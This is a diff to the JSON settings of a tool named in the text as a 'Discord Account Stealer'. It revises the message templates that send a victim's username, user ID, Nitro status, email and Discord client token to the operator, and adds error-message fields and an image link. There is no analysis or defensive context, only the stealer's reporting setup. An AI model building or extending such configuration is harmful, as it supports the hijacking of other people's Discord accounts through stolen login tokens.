@@ -12,9 +12,11 @@
     "Embed": {
         "ErrorColor": "#e94949",
         "SuccessColor": "#49e959",
-        "MessageTitle": "Discord Account | {1}",
+        "MessageTitle": "Discord Account | {username}",
+        "ErrorMessageTitle": "Discord Account Stealer | ERROR",
+        "ErrorMessageBody": "ERROR: {error}",
         "MessageBody": "__**:clipboard: Account Details:**__\\n\\n**:blue_book: AT:** _{location}_\\n\\n**:bust_in_silhouette: User:** {username}\\n\\n**:id: Client ID:** {userID}\\n\\n**:moneybag: Has Nitro:** {HasNitro}\\n\\n**:mailbox_with_mail: Email:** {email}{spoiler}\\n\\n**:key: Client Token:**\\n||{token}||",
-        "ErrorImageURL": "",
-        "SuccessImageURL": "{1}"
+        "ErrorImageURL": "https://w7.pngwing.com/pngs/959/708/png-transparent-error-icon-attention-angle-triangle-logo.png",
+        "SuccessImageURL": "{ImageURL}"
     }
 }
